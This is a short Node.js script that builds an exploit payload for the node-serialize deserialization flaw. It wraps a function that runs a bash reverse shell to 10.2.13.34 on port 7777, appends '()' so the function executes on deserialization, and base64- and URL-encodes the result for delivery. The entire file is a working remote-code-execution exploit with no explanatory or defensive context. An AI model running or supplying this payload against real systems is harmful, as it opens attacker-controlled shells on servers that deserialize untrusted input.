var serialize = require('node-serialize');

var payload = {
    pwn: function(){
        require("child_process").exec("bash -c 'bash -i >& /dev/tcp/10.2.13.34/7777 0>&1'")
    }
};

var serialized = serialize.serialize(payload);
var vuln_payload = serialized.replace('}"','}()"');

var encoded = Buffer.from(vuln_payload).toString('base64')
console.log(encodeURIComponent(encoded))
